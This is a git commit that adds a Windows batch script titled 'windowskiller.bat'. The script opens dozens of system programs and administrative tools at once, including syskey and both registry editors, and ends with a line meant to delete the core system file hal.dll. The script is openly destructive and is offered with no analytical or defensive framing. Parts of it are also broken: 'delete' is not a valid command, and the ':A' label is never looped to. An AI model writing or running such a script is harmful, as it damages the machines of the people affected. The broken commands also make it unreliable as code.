19b6f44f9c17d62e3d4dd809df8171bfc05d96ce
Arda <108670057+Neverkoo@users.noreply.github.com>
2022-08-03 20:19:38 +0300

    Add files via upload

---
+++ windowskiller.bat
@@ -0,0 +1,68 @@
+
+@echo off
+color a
+
+cls
+
+pause
+:A
+start calc.exe
+start devmgmt.msc
+start dfrg.msc
+start eudcedit.exe
+start appwiz.cpl
+start access.cpl
+start accwiz.exe
+start desk.cpl
+start eventvwr.exe
+start freecell.exe
+start fsmgmt.msc
+start hdwwiz.cpl
+start iexpress.exe
+start inetcpl.cpl
+start ntl.cpl 
+start joy.cpl 
+start magnify.exe 
+start main.cpl
+start mmsys.cpl 
+start mspaint.exe 
+start narrator.exe 
+start ntbackup.exe 
+start nusrmgr.cpl 
+start osk.exe 
+start telnet.exe
+start spider.exe 
+start gpedit.msc 
+start msconfig.exe 
+start verifier.exe 
+start drwtsn32.exe 
+start dxdiag.exe
+start mobsync.exe 
+start mplay32.exe 
+start odbcad32.exe 
+start packager.exe 
+start perfmon.exe 
+start progman.exe 
+start rasphone.exe 
+start shrpubw.exe 
+start sigverif.exe 
+start sysedit.exe 
+start syskey.exe 
+start sndrec32.exe 
+start timedate.cpl 
+start tourstart.exe
+start winchat.exe 
+start winmine.exe 
+start write.exe 
+start wupdmgr.exe 
+start explorer.exe
+start powercfg.cpl
+start rasphone.exe 
+start regedt32.exe 
+start regedit.exe 
+start sndvol32.exe 
+start notepad.exe 
+start taskmgr.exe 
+start compmgmt.msc
+start clipbrd.exe
+delete hal.dll
